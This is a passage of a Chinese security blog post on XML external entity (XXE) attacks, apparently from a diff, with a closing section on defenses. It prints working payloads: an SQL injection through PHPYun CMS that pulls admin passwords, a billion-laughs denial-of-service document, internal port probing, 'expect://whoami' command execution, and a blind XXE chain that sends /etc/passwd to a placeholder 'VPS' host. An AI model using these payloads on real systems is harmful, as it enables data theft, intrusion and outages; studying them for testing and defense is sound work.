+<h2 id="XXE与SQL注入"><a href="#XXE与SQL注入" class="headerlink" title="XXE与SQL注入"></a>XXE与SQL注入</h2><h3 id="原理-PHPYun-cms为例"><a href="#原理-PHPYun-cms为例" class="headerlink" title="原理(PHPYun cms为例)"></a>原理(PHPYun cms为例)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($MsgType==<span class="string">'event'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">      $MsgEvent = $postObj-&gt;Event;</span><br><span class="line">      <span class="keyword">if</span> ($MsgEvent==<span class="string">'subscribe'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $centerStr = <span class="string">"&lt;![CDATA[欢迎您关注"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"！/n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]&gt;"</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">elseif</span> ($MsgEvent==<span class="string">'CLICK'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $EventKey = $postObj-&gt;EventKey;</span><br><span class="line">       <span class="keyword">if</span>($EventKey==<span class="string">'我的帐号'</span>)&#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;bindUser($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'我的消息'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;myMsg($fromUsername);</span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'面试邀请'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;Audition($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'简历查看'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;lookResume($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'刷新简历'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>- &gt; refResume （$ fromUsername ）;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isBind</span><span class="params">($wxid=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>($wxid)</span><br><span class="line">		&#123;</span><br><span class="line">			$User = <span class="keyword">$this</span>-&gt;obj-&gt;DB_select_once(<span class="string">"member"</span>,<span class="string">"`wxid`='"</span>.$wxid.<span class="string">"'"</span>,<span class="string">"`uid`,`username`"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($User[<span class="string">'uid'</span>]&gt;<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$User[<span class="string">'bindtype'</span>] = <span class="string">'1'</span>;</span><br><span class="line">			$User[<span class="string">'cenetrTpl'</span>] = <span class="string">"&lt;Content&gt;&lt;![CDATA[您的"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"帐号："</span>.$User[<span class="string">'username'</span>].<span class="string">"已成功绑定！ \n\n\n 您也可以&lt;a href=\""</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">"/wap/index.php?m=login&amp;wxid="</span>.$wxid.<span class="string">"\"&gt;点击这里&lt;/a&gt;进行解绑或绑定其他帐号]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$Token = <span class="keyword">$this</span>-&gt;getToken();</span><br><span class="line">			$Url = <span class="string">'https://api.weixin.qq.com/cgi-bin/user/info?access_token='</span>.$Token.<span class="string">'&amp;openid='</span>.$wxid.<span class="string">'&amp;lang=zh_CN'</span>;</span><br><span class="line">			$CurlReturn  = <span class="keyword">$this</span>-&gt;CurlPost($Url);</span><br><span class="line">			$UserInfo    = json_decode($CurlReturn);</span><br><span class="line">			</span><br><span class="line">			$wxid        = $wxid;</span><br><span class="line">			$wxname      = $UserInfo-&gt;nickname;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;config[<span class="string">'token_time'</span>] = time();</span><br><span class="line">			$User[<span class="string">'cenetrTpl'</span>] = <span class="string">'&lt;Content&gt;&lt;![CDATA[您还没有绑定帐号，&lt;a href="'</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">'/wap/index.php?m=login&amp;wxid='</span>.$wxid.<span class="string">'"&gt;点击这里&lt;/a&gt;进行绑定!]]&gt;&lt;/Content&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $User;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以看到第一段代码满足后，会进入第二段代码的isBind函数，这里<code>$wxid</code>是我们传入的<code>FromUserName</code>的值，我们在上面XXE原理进行过代码审计知道它不会对我们传入的数据进行过滤，由此可进行SQL注入<br>payload:<br><code>&lt;FromUserName&gt;1111&#39; and 1=2 union select 1,(select concat(username,0x23,password) from phpyun_admin_user limit 0,1)#&lt;/FromUserName&gt;</code>  需要注意的是一定要修改HTTP请求为Content-Type: text/ xml; </p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p> 为避免重复造轮，可自行查看<a href="https://m.hundan.org/wooyun-2015-0122523" target="_blank" rel="noopener">火遍各大高校的某方教务，可拖数据库</a></p>
+<h2 id="XXE与XSS攻击"><a href="#XXE与XSS攻击" class="headerlink" title="XXE与XSS攻击"></a>XXE与XSS攻击</h2><p> 这篇文章写的很不错，可以借鉴一下<br> <a href="https://paper.seebug.org/80/" target="_blank" rel="noopener">使用XML内部实体绕过Chrome和IE的XSS过滤器</a></p>
+<h2 id="XXE与DDOS攻击"><a href="#XXE与DDOS攻击" class="headerlink" title="XXE与DDOS攻击"></a>XXE与DDOS攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p> 一般分为两种：</p>
+<ul>
+<li>1.请求大的文件(eg:C:/pagefile.sys 或/dev/random)<br>/dev/random处于unix中，用作伪随机数生成<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY go <span class="string">"file:///dev/random"</span> &gt;]&gt;&lt;msg&gt;&amp;go;&lt;/msg&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<ul>
+<li>2.billion laughs攻击，即通过不断递归调用来使解析器繁忙，占用内存最终崩掉。（可配合LOIC工具，食用更佳）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--此代码包含<span class="number">10</span>亿个大文件，约占<span class="number">3000</span>M字节内存--&gt;</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol <span class="string">"lol"</span>&gt;</span><br><span class="line">&lt;!ELEMENT lolz (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ENTITY lol1 <span class="string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol</span></span><br><span class="line"><span class="string">;&amp;lol;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol2 <span class="string">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;</span></span><br><span class="line"><span class="string">lol1;&amp;lol1;&amp;lol1;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol3 <span class="string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;</span></span><br><span class="line"><span class="string">lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol4 <span class="string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;</span></span><br><span class="line"><span class="string">lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol5 <span class="string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;</span></span><br><span class="line"><span class="string">lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol6 <span class="string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;</span></span><br><span class="line"><span class="string">lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol7 <span class="string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;</span></span><br><span class="line"><span class="string">lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol8 <span class="string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;</span></span><br><span class="line"><span class="string">lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol9 <span class="string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;</span></span><br><span class="line"><span class="string">lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p> <a href="https://m.hundan.org/wooyun-2015-0137143" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0137143</a> </p>
+<h2 id="XXE与内网信息，命令执行"><a href="#XXE与内网信息，命令执行" class="headerlink" title="XXE与内网信息，命令执行"></a>XXE与内网信息，命令执行</h2><p> 这里就不进行原理阐述了，和解释器有一些关系，直接上干货，以下建议配合脚本食用更佳。</p>
+<ul>
+<li>探测端口<br>如果失败则可能返回<code>Connection refused</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://192.168.0.1:3306"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></li>
+<li>探测内网IP</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://otherIP"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在安装有expect扩展的php环境执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"expect://whoami"</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE与Flash跨域攻击（个人认为鸡肋）"><a href="#XXE与Flash跨域攻击（个人认为鸡肋）" class="headerlink" title="XXE与Flash跨域攻击（个人认为鸡肋）"></a>XXE与Flash跨域攻击（个人认为鸡肋）</h2><p>这个突破感觉几乎没有什么用，而且利用条件也相对苛刻很多，可以自行查看<a href="https://m.hundan.org/wooyun-2012-08182" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2012-08182</a><br><a href="https://m.hundan.org/wooyun-2011-02491" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2011-02491</a></p>
+</li>
+</ul>
+<h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>博主很久之前写的，想来想去就不打算再增加例题和减少掉例题了(懒)，多少有点帮助，看着玩吧哈哈</p>
+<h2 id="API："><a href="#API：" class="headerlink" title="API："></a>API：</h2><p><a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">http://web.jarvisoj.com:9882</a><br><img src="https://img-blog.csdnimg.cn/20200210162334155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Blind-XXE思路："><a href="#Blind-XXE思路：" class="headerlink" title="Blind XXE思路："></a>Blind XXE思路：</h2><p>1.客户端发送payload1给web服务器<br>2.网络服务器向VPS获取恶意DTD，并执行文件读取payload2<br>3.网页服务器带着回显结果访问VPS上特定的FTP或者HTTP<br>4.通过VPS获得回显(NC监听端口)<br>payload1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> xml version= <span class="string">"1.0"</span> encoding= <span class="string">"UTF-8"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE [&lt;!ENTITY ％ remote SYSTEM <span class="string">"http://vps/test.xml"</span>&gt; </span><br><span class="line">％remote;</span><br><span class="line">] &gt;</span><br></pre></td></tr></table></figure>
+<p>payload2(服务器端文件)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY % trick SYSTEM 'ftp://VPS:21/%payload;'&gt;"</span>&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
+<li>1.及时升级第三方代码，中间件等</li>
+<li>2.过滤用户输入数据</li>
+<li>3.使用php及Java等语言的禁用外部实体方法</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php：libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">python:from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://yoursite.com">John Doe</a>
+            <p>原文链接：<a href="http://yoursite.com/2020/03/14/xml%E6%B3%A8%E5%85%A5/">http://yoursite.com/2020/03/14/xml%E6%B3%A8%E5%85%A5/</a>
+            <p>发表日期：<a href="http://yoursite.com/2020/03/14/xml%E6%B3%A8%E5%85%A5/">March 14th 2020, 8:26:50 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2020/03/14/xml%E6%B3%A8%E5%85%A5/">March 14th 2020, 8:53:44 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC80OTA5My8yNTU4OA==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:Y_Y_K@x2.tn" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/yanyouke" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简易xml概括"><span class="toc-number">1.</span> <span class="toc-text">简易xml概括</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#实体引用"><span class="toc-number">1.1.</span> <span class="toc-text">实体引用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD-文档类型定义"><span class="toc-number">1.2.</span> <span class="toc-text">DTD(文档类型定义)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#定义："><span class="toc-number">1.2.1.</span> <span class="toc-text">定义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构建方式："><span class="toc-number">1.2.2.</span> <span class="toc-text">构建方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-内部实体声明"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">1.内部实体声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-外部实体声明及默认协议"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">2.外部实体声明及默认协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-参数实体"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">3.参数实体</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">2.1.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-以PHPYun-cms为例"><span class="toc-number">2.1.1.</span> <span class="toc-text">原理(以PHPYun cms为例)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#外部实体注入"><span class="toc-number">2.1.2.</span> <span class="toc-text">外部实体注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于盲注的XXE"><span class="toc-number">2.1.3.</span> <span class="toc-text">基于盲注的XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#验证漏洞"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">验证漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于报错的XXE"><span class="toc-number">2.1.4.</span> <span class="toc-text">基于报错的XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML配置文件未授权访问"><span class="toc-number">2.1.5.</span> <span class="toc-text">XML配置文件未授权访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE与SQL注入"><span class="toc-number">2.2.</span> <span class="toc-text">XXE与SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-PHPYun-cms为例"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理(PHPYun cms为例)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">2.2.2.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE与XSS攻击"><span class="toc-number">2.3.</span> <span class="toc-text">XXE与XSS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE与DDOS攻击"><span class="toc-number">2.4.</span> <span class="toc-text">XXE与DDOS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例-1"><span class="toc-number">2.4.2.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE与内网信息，命令执行"><span class="toc-number">2.5.</span> <span class="toc-text">XXE与内网信息，命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE与Flash跨域攻击（个人认为鸡肋）"><span class="toc-number">2.6.</span> <span class="toc-text">XXE与Flash跨域攻击（个人认为鸡肋）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF例题"><span class="toc-number">3.</span> <span class="toc-text">CTF例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#API："><span class="toc-number">3.1.</span> <span class="toc-text">API：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-XXE思路："><span class="toc-number">3.2.</span> <span class="toc-text">Blind XXE思路：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 1
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/14/xml%E6%B3%A8%E5%85%A5/" >xml注入</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="web漏洞总结"><span class="iconfont-archer">&#xe606;</span>web漏洞总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web漏洞总结"><span class="iconfont-archer">&#xe60a;</span>web漏洞总结</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
